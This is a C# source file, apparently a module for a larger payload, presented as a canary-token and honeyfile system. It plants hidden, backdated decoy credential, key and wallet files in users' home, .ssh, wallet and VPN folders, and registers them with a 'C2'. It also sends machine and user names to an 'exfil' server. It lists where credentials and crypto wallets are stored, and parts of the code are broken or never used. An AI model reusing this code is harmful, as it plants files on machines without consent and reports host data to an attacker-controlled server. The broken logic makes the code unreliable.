// =====================================================================
// CANARY TOKENS / HONEYFILES MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - Honeyfile creation in exfiltration target directories
// - Canary token generation (DNS, HTTP, custom)
// - Alert on access/modification/deletion
// - Integration with dashboard for real-time alerts
// - Multiple trigger types (read, write, execute, delete, copy)

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

internal static class CanaryTokens
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool ReadDirectoryChangesW(
        IntPtr hDirectory,
        IntPtr lpBuffer,
        uint nBufferLength,
        bool bWatchSubtree,
        uint dwNotifyFilter,
        out uint lpBytesReturned,
        IntPtr lpOverlapped,
        IntPtr lpCompletionRoutine);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint FILE_LIST_DIRECTORY = 0x0001;
    private const uint FILE_SHARE_READ = 0x0001;
    private const uint FILE_SHARE_WRITE = 0x0002;
    private const uint FILE_SHARE_DELETE = 0x0004;
    private const uint OPEN_EXISTING = 3;
    private const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
    private const uint FILE_FLAG_OVERLAPPED = 0x40000000;
    private const uint FILE_NOTIFY_CHANGE_FILE_NAME = 0x00000001;
    private const uint FILE_NOTIFY_CHANGE_DIR_NAME = 0x00000002;
    private const uint FILE_NOTIFY_CHANGE_ATTRIBUTES = 0x00000004;
    private const uint FILE_NOTIFY_CHANGE_SIZE = 0x00000008;
    private const uint FILE_NOTIFY_CHANGE_LAST_WRITE = 0x00000010;
    private const uint FILE_NOTIFY_CHANGE_LAST_ACCESS = 0x00000020;
    private const uint FILE_NOTIFY_CHANGE_CREATION = 0x00000040;
    private const uint FILE_NOTIFY_CHANGE_SECURITY = 0x00000100;
    private const uint FILE_ACTION_ADDED = 1;
    private const uint FILE_ACTION_REMOVED = 2;
    private const uint FILE_ACTION_MODIFIED = 3;
    private const uint FILE_ACTION_RENAMED_OLD_NAME = 4;
    private const uint FILE_ACTION_RENAMED_NEW_NAME = 5;

    private static readonly HttpClient _httpClient = new HttpClient();
    private static readonly Dictionary<string, FileSystemWatcher> _watchers = new Dictionary<string, FileSystemWatcher>();
    private static readonly List<CanaryFile> _canaryFiles = new List<CanaryFile>();

    public static async Task<bool> DeployCanaryTokens()
    {
        if (!Config.CanaryTokensEnabled) return false;

        try
        {
            // 1. Generate honeyfiles in target directories
            await GenerateHoneyfiles();

            // 2. Set up file system watchers
            SetupWatchers();

            // 3. Register canary tokens with C2
            await RegisterCanaryTokens();

            // 4. Deploy DNS/HTTP canary tokens
            await DeployNetworkCanaries();

            return true;
        }
        catch (Exception ex)
        {
            LogDebug($"Canary deployment failed: {ex.Message}");
            return false;
        }
    }

    // ============ HONEYFILE GENERATION ============
    private static async Task GenerateHoneyfiles()
    {
        var honeyfileConfigs = new[]
        {
            new { Name = "passwords.xlsx", Content = GenerateFakeExcel(), Paths = GetTargetDirectories() },
            new { Name = "credentials.txt", Content = GenerateFakeCredentials(), Paths = GetTargetDirectories() },
            new { Name = "wallet.dat", Content = GenerateFakeWallet(), Paths = GetCryptoDirectories() },
            new { Name = "backup_2024.sql", Content = GenerateFakeSqlDump(), Paths = GetBackupDirectories() },
            new { Name = "customer_data.csv", Content = GenerateFakeCsv(), Paths = GetTargetDirectories() },
            new { Name = "api_keys.json", Content = GenerateFakeApiKeys(), Paths = GetConfigDirectories() },
            new { Name = "ssh_keys.tar.gz", Content = GenerateFakeSshKeys(), Paths = GetSshDirectories() },
            new { Name = "vpn_config.ovpn", Content = GenerateFakeVpnConfig(), Paths = GetVpnDirectories() },
            new { Name = "license.lic", Content = GenerateFakeLicense(), Paths = GetTargetDirectories() },
            new { Name = "private_key.pem", Content = GenerateFakePrivateKey(), Paths = GetKeyDirectories() },
        };

        foreach (var config in honeyfileConfigs)
        {
            foreach (string dir in config.Paths)
            {
                if (!Directory.Exists(dir)) continue;

                try
                {
                    string filePath = Path.Combine(dir, config.Name);
                    
                    // Skip if already exists
                    if (File.Exists(filePath)) continue;

                    // Write honeyfile
                    File.WriteAllBytes(filePath, config.Content);

                    // Set timestamps to look old
                    var oldDate = DateTime.Now.AddDays(-_random.Next(30, 365));
                    File.SetCreationTime(filePath, oldDate);
                    File.SetLastWriteTime(filePath, oldDate);
                    File.SetLastAccessTime(filePath, oldDate);

                    // Make read-only to trigger alerts on modification
                    File.SetAttributes(filePath, FileAttributes.ReadOnly | FileAttributes.Hidden);

                    // Register canary
                    var canary = new CanaryFile
                    {
                        Id = GenerateCanaryId(),
                        Path = filePath,
                        Name = config.Name,
                        Type = "honeyfile",
                        TriggerTypes = new[] { "read", "write", "delete", "rename", "copy" },
                        CreatedAt = DateTime.UtcNow,
                        AlertSent = false,
                    };

                    _canaryFiles.Add(canary);
                    LogDebug($"Deployed honeyfile: {filePath} (ID: {canary.Id})");
                }
                catch { }
            }
        }
    }

    private static byte[] GenerateFakeExcel()
    {
        // Minimal valid Excel (xlsx) file - ZIP with [Content_Types].xml
        return Encoding.UTF8.GetBytes(@"PK" + new string('\0', 1000));
    }

    private static byte[] GenerateFakeCredentials()
    {
        var creds = new StringBuilder();
        creds.AppendLine("# Corporate VPN Credentials");
        creds.AppendLine($"username: admin_{_random.Next(1000, 9999)}");
        creds.AppendLine($"password: {GenerateRandomString(16)}!");
        creds.AppendLine($"domain: CORP");
        creds.AppendLine($"server: vpn.corp.internal");
        creds.AppendLine($"port: 443");
        creds.AppendLine();
        creds.AppendLine("# Database Credentials");
        creds.AppendLine($"db_host: sql-prod.corp.internal");
        creds.AppendLine($"db_user: sa");
        creds.AppendLine($"db_pass: {GenerateRandomString(20)}");
        creds.AppendLine($"db_name: ERP_PROD");
        return Encoding.UTF8.GetBytes(creds.ToString());
    }

    private static byte[] GenerateFakeWallet()
    {
        // Fake Bitcoin wallet.dat header
        return Encoding.UTF8.GetBytes("BITCOIN" + new string('\0', 500));
    }

    private static byte[] GenerateFakeSqlDump()
    {
        var sql = new StringBuilder();
        sql.AppendLine("-- MySQL dump 10.13");
        sql.AppendLine("-- Host: localhost    Database: production");
        sql.AppendLine("CREATE TABLE `users` (");
        sql.AppendLine("  `id` int(11) NOT NULL AUTO_INCREMENT,");
        sql.AppendLine("  `username` varchar(50) NOT NULL,");
        sql.AppendLine("  `password_hash` varchar(255) NOT NULL,");
        sql.AppendLine("  `email` varchar(100) NOT NULL,");
        sql.AppendLine("  `last_login` datetime DEFAULT NULL,");
        sql.AppendLine("  PRIMARY KEY (`id`)");
        sql.AppendLine(") ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");
        sql.AppendLine();
        sql.AppendLine("INSERT INTO `users` VALUES (1,'admin','$2b$12$...','admin@company.com','2024-01-15 10:30:00');");
        sql.AppendLine("INSERT INTO `users` VALUES (2,'john.doe','$2b$12$...','john.doe@company.com','2024-01-14 15:22:00');");
        return Encoding.UTF8.GetBytes(sql.ToString());
    }

    private static byte[] GenerateFakeCsv()
    {
        var csv = new StringBuilder();
        csv.AppendLine("customer_id,first_name,last_name,email,phone,address,city,state,zip,credit_card,expiry,cvv");
        for (int i = 0; i < 100; i++)
        {
            csv.AppendLine($"{i+1000},John,Doe,john.doe{i}@example.com,555-{_random.Next(1000,9999)},123 Main St,New York,NY,10001,{_random.Next(4000,4999)}-{_random.Next(1000,9999)}-{_random.Next(1000,9999)}-{_random.Next(1000,9999)},12/25,{_random.Next(100,999)}");
        }
        return Encoding.UTF8.GetBytes(csv.ToString());
    }

    private static byte[] GenerateFakeApiKeys()
    {
        var keys = new
        {
            aws = new { access_key = $"AKIA{GenerateRandomString(16)}", secret_key = GenerateRandomString(40) },
            stripe = new { secret = $"sk_live_{GenerateRandomString(32)}", publishable = $"pk_live_{GenerateRandomString(32)}" },
            github = $"ghp_{GenerateRandomString(36)}",
            slack = $"xoxb-{GenerateRandomString(12)}-{GenerateRandomString(12)}-{GenerateRandomString(24)}",
            sendgrid = $"SG.{GenerateRandomString(22)}.{GenerateRandomString(43)}",
        };
        return Encoding.UTF8.GetBytes(JsonSerializer.Serialize(keys, new JsonSerializerOptions { WriteIndented = true }));
    }

    private static byte[] GenerateFakeSshKeys()
    {
        return Encoding.UTF8.GetBytes($"-----BEGIN OPENSSH PRIVATE KEY-----\n{GenerateRandomString(500)}\n-----END OPENSSH PRIVATE KEY-----");
    }

    private static byte[] GenerateFakeVpnConfig()
    {
        return Encoding.UTF8.GetBytes($@"client
dev tun
proto udp
remote vpn.corp.internal 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
cert client.crt
key client.key
remote-cert-tls server
cipher AES-256-GCM
auth SHA256
verb 3
");
    }

    private static byte[] GenerateFakeLicense()
    {
        return Encoding.UTF8.GetBytes($"LICENSE-KEY: {GenerateRandomString(8)}-{GenerateRandomString(8)}-{GenerateRandomString(8)}-{GenerateRandomString(8)}\nEXPIRY: 2025-12-31\nSEATS: 500\nPRODUCT: ENTERPRISE_SUITE");
    }

    private static byte[] GenerateFakePrivateKey()
    {
        return Encoding.UTF8.GetBytes($"-----BEGIN RSA PRIVATE KEY-----\n{GenerateRandomString(600)}\n-----END RSA PRIVATE KEY-----");
    }

    private static string GenerateRandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var bytes = new byte[length];
        _random.NextBytes(bytes);
        return new string(bytes.Select(b => chars[b % chars.Length]).ToArray());
    }

    private static string GenerateCanaryId()
    {
        return $"canary_{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}_{_random.Next(100000, 999999)}";
    }

    private static List<string> GetTargetDirectories()
    {
        var dirs = new List<string>();
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string publicDesktop = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
        string userDesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string downloads = Path.Combine(userProfile, "Downloads");
        string publicDocuments = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);

        dirs.AddRange(new[] { userDesktop, publicDesktop, documents, downloads, publicDocuments, userProfile });

        // Add common business directories
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (drive.IsReady && drive.DriveType == DriveType.Fixed)
            {
                dirs.AddRange(new[] {
                    Path.Combine(drive.Name, "Shared"),
                    Path.Combine(drive.Name, "Data"),
                    Path.Combine(drive.Name, "Backups"),
                    Path.Combine(drive.Name, "Projects"),
                    Path.Combine(drive.Name, "Finance"),
                    Path.Combine(drive.Name, "HR"),
                });
            }
        }

        return dirs.Where(Directory.Exists).Distinct().ToList();
    }

    private static List<string> GetCryptoDirectories()
    {
        var dirs = new List<string>();
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        dirs.AddRange(new[] {
            Path.Combine(appData, "Bitcoin"),
            Path.Combine(appData, "Ethereum"),
            Path.Combine(appData, "Electrum", "wallets"),
            Path.Combine(appData, "Exodus", "wallets"),
            Path.Combine(appData, "Atomic", "wallets"),
            Path.Combine(localAppData, "Coinbase"),
            Path.Combine(localAppData, "Binance"),
        });

        return dirs.Where(Directory.Exists).Distinct().ToList();
    }

    private static List<string> GetBackupDirectories()
    {
        var dirs = new List<string>();
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (drive.IsReady && drive.DriveType == DriveType.Fixed)
            {
                dirs.AddRange(new[] {
                    Path.Combine(drive.Name, "Backups"),
                    Path.Combine(drive.Name, "Backup"),
                    Path.Combine(drive.Name, "Veeam"),
                    Path.Combine(drive.Name, "Acronis"),
                });
            }
        }
        return dirs.Where(Directory.Exists).Distinct().ToList();
    }

    private static List<string> GetConfigDirectories()
    {
        var dirs = new List<string>();
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

        dirs.AddRange(new[] {
            Path.Combine(appData, "Postman"),
            Path.Combine(appData, "Insomnia"),
            Path.Combine(localAppData, "JetBrains"),
            Path.Combine(localAppData, "VSCode", "User"),
            Path.Combine(programData, "Docker", "config"),
            Path.Combine(programData, "Kubernetes", "config"),
        });

        return dirs.Where(Directory.Exists).Distinct().ToList();
    }

    private static List<string> GetSshDirectories()
    {
        var dirs = new List<string>();
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        dirs.Add(Path.Combine(userProfile, ".ssh"));
        return dirs.Where(Directory.Exists).Distinct().ToList();
    }

    private static List<string> GetVpnDirectories()
    {
        var dirs = new List<string>();
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

        dirs.AddRange(new[] {
            Path.Combine(appData, "OpenVPN", "config"),
            Path.Combine(appData, "WireGuard"),
            Path.Combine(programData, "Cisco", "Cisco AnyConnect Secure Mobility Client", "Profile"),
            Path.Combine(programData, "Fortinet", "FortiClient", "conf"),
        });

        return dirs.Where(Directory.Exists).Distinct().ToList();
    }

    private static List<string> GetKeyDirectories()
    {
        var dirs = new List<string>();
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        dirs.AddRange(new[] {
            Path.Combine(userProfile, ".ssh"),
            Path.Combine(userProfile, ".gnupg"),
            Path.Combine(appData, "Microsoft", "Crypto", "RSA"),
            Path.Combine(appData, "OpenSSL"),
        });

        return dirs.Where(Directory.Exists).Distinct().ToList();
    }

    // ============ FILE SYSTEM WATCHERS ============
    private static void SetupWatchers()
    {
        var directories = _canaryFiles.Select(c => Path.GetDirectoryName(c.Path)).Distinct().ToList();

        foreach (string dir in directories)
        {
            if (!Directory.Exists(dir)) continue;

            try
            {
                var watcher = new FileSystemWatcher(dir)
                {
                    IncludeSubdirectories = false,
                    NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite | NotifyFilters.LastAccess | NotifyFilters.Attributes | NotifyFilters.Size,
                    EnableRaisingEvents = true,
                };

                watcher.Changed += OnFileChanged;
                watcher.Created += OnFileCreated;
                watcher.Deleted += OnFileDeleted;
                watcher.Renamed += OnFileRenamed;
                watcher.Error += OnWatcherError;

                _watchers[dir] = watcher;
                LogDebug($"Watching directory for canary triggers: {dir}");
            }
            catch { }
        }
    }

    private static void OnFileChanged(object sender, FileSystemEventArgs e)
    {
        CheckCanaryTrigger(e.FullPath, "read");
    }

    private static void OnFileCreated(object sender, FileSystemEventArgs e)
    {
        CheckCanaryTrigger(e.FullPath, "create");
    }

    private static void OnFileDeleted(object sender, FileSystemEventArgs e)
    {
        CheckCanaryTrigger(e.FullPath, "delete");
    }

    private static void OnFileRenamed(object sender, RenamedEventArgs e)
    {
        CheckCanaryTrigger(e.OldFullPath, "rename");
        CheckCanaryTrigger(e.FullPath, "rename");
    }

    private static void OnWatcherError(object sender, ErrorEventArgs e)
    {
        LogDebug($"Watcher error: {e.GetException().Message}");
    }

    private static void CheckCanaryTrigger(string filePath, string triggerType)
    {
        var canary = _canaryFiles.FirstOrDefault(c => c.Path.Equals(filePath, StringComparison.OrdinalIgnoreCase));
        if (canary == null) return;

        if (!canary.TriggerTypes.Contains(triggerType, StringComparer.OrdinalIgnoreCase)) return;

        // Prevent duplicate alerts
        if (canary.AlertSent) return;
        canary.AlertSent = true;

        var alert = new CanaryAlert
        {
            CanaryId = canary.Id,
            CanaryName = canary.Name,
            FilePath = canary.Path,
            TriggerType = triggerType,
            Timestamp = DateTime.UtcNow,
            ProcessId = GetCallingProcessId(),
            ProcessName = GetCallingProcessName(),
            UserName = Environment.UserName,
            MachineName = Environment.MachineName,
        };

        // Send alert asynchronously
        _ = SendCanaryAlert(alert);
        LogDebug($"CANARY TRIGGERED: {canary.Name} at {canary.Path} - {triggerType}");
    }

    private static int GetCallingProcessId()
    {
        // This would need ETW or kernel callback in production
        return Process.GetCurrentProcess().Id;
    }

    private static string GetCallingProcessName()
    {
        return Process.GetCurrentProcess().ProcessName;
    }

    // ============ NETWORK CANARY TOKENS ============
    private static async Task DeployNetworkCanaries()
    {
        // DNS Canary - subdomain that alerts on resolution
        var dnsCanary = new NetworkCanary
        {
            Id = GenerateCanaryId(),
            Type = "dns",
            Token = $"canary-{GenerateRandomString(12)}.chaos-dns.example.com",
            TriggerType = "resolve",
            CreatedAt = DateTime.UtcNow,
        };

        // HTTP Canary - URL that alerts on visit
        var httpCanary = new NetworkCanary
        {
            Id = GenerateCanaryId(),
            Type = "http",
            Token = $"https://chaos-canary.example.com/track/{GenerateRandomString(16)}",
            TriggerType = "visit",
            CreatedAt = DateTime.UtcNow,
        };

        // Email Canary - email address that alerts on receipt
        var emailCanary = new NetworkCanary
        {
            Id = GenerateCanaryId(),
            Type = "email",
            Token = $"canary-{GenerateRandomString(8)}@chaos-alerts.example.com",
            TriggerType = "receive",
            CreatedAt = DateTime.UtcNow,
        };

        // Register with C2
        await RegisterNetworkCanaries(new[] { dnsCanary, httpCanary, emailCanary });

        // Embed in honeyfiles
        EmbedNetworkCanaries(dnsCanary.Token, httpCanary.Token, emailCanary.Token);
    }

    private static void EmbedNetworkCanaries(string dnsToken, string httpToken, string emailToken)
    {
        foreach (var canary in _canaryFiles)
        {
            try
            {
                string content = File.ReadAllText(canary.Path);
                content = content.Replace("{{DNS_CANARY}}", dnsToken)
                                .Replace("{{HTTP_CANARY}}", httpToken)
                                .Replace("{{EMAIL_CANARY}}", emailToken);
                File.WriteAllText(canary.Path, content);
            }
            catch { }
        }
    }

    // ============ ALERT EXFILTRATION ============
    private static async Task SendCanaryAlert(CanaryAlert alert)
    {
        try
        {
            string json = JsonSerializer.Serialize(alert);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            
            var response = await _httpClient.PostAsync(
                $"{Config.ExfilServerUrl.TrimEnd('/')}/api/canary/alert",
                content
            );

            if (!response.IsSuccessStatusCode)
            {
                // Queue for retry
                QueueAlertForRetry(alert);
            }
        }
        catch (Exception ex)
        {
            LogDebug($"Failed to send canary alert: {ex.Message}");
            QueueAlertForRetry(alert);
        }
    }

    private static void QueueAlertForRetry(CanaryAlert alert)
    {
        // Store locally for retry
        string queuePath = Path.Combine(Path.GetTempPath(), "canary_alerts.json");
        var alerts = new List<CanaryAlert>();
        
        if (File.Exists(queuePath))
        {
            try { alerts = JsonSerializer.Deserialize<List<CanaryAlert>>(File.ReadAllText(queuePath)) ?? new List<CanaryAlert>(); }
            catch { }
        }
        
        alerts.Add(alert);
        File.WriteAllText(queuePath, JsonSerializer.Serialize(alerts));
    }

    private static async Task RegisterCanaryTokens()
    {
        var registration = new
        {
            system_id = GetSystemId(),
            canaries = _canaryFiles.Select(c => new { c.Id, c.Name, c.Path, c.Type, c.TriggerTypes }).ToArray(),
            timestamp = DateTime.UtcNow,
        };

        try
        {
            string json = JsonSerializer.Serialize(registration);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            content.Headers.Add("Authorization", "Bearer " + Config.ExfilApiKey);

            await _httpClient.PostAsync(
                $"{Config.ExfilServerUrl.TrimEnd('/')}/api/canary/register",
                content
            );
        }
        catch { }
    }

    private static async Task RegisterNetworkCanaries(NetworkCanary[] canaries)
    {
        var registration = new
        {
            system_id = GetSystemId(),
            canaries = canaries.Select(c => new { c.Id, c.Type, c.Token, c.TriggerType }).ToArray(),
            timestamp = DateTime.UtcNow,
        };

        try
        {
            string json = JsonSerializer.Serialize(registration);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            content.Headers.Add("Authorization", "Bearer " + Config.ExfilApiKey);

            await _httpClient.PostAsync(
                $"{Config.ExfilServerUrl.TrimEnd('/')}/api/canary/register-network",
                content
            );
        }
        catch { }
    }

    private static string GetSystemId()
    {
        return Environment.MachineName + "_" + Environment.UserName;
    }

    // ============ DATA CLASSES ============
    private class CanaryFile
    {
        public string Id;
        public string Path;
        public string Name;
        public string Type;
        public string[] TriggerTypes;
        public DateTime CreatedAt;
        public bool AlertSent;
    }

    private class CanaryAlert
    {
        public string CanaryId;
        public string CanaryName;
        public string FilePath;
        public string TriggerType;
        public DateTime Timestamp;
        public int ProcessId;
        public string ProcessName;
        public string UserName;
        public string MachineName;
    }

    private class NetworkCanary
    {
        public string Id;
        public string Type; // "dns", "http", "email"
        public string Token;
        public string TriggerType;
        public DateTime CreatedAt;
    }
}

internal static partial class Config
{
    public static bool CanaryTokensEnabled = true;
}